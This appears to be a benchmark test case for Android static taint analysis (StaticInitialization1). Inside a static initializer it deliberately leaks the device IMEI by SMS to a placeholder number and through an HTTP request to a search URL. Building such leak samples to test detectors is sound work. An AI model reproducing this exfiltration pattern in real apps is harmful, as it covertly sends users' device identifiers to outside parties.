package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name StaticInitialization1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description tainted data is leaked to a sink during static initialization of a class
 * @dataflow source -> im -> sink
 * @number_of_leaks 1
 * @challenges the analysis has to consider static initialization
 */
public class MainActivity extends Activity {
	public static String im;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}

        im = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
		StaticInitClass1 s1 = new StaticInitClass1();
	}

	public static class StaticInitClass1{
		static{
			SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49 1234", null, im, null, null);   //sink, leak

			try {
				connect(im);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
	}

	private static void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
	}
    
}
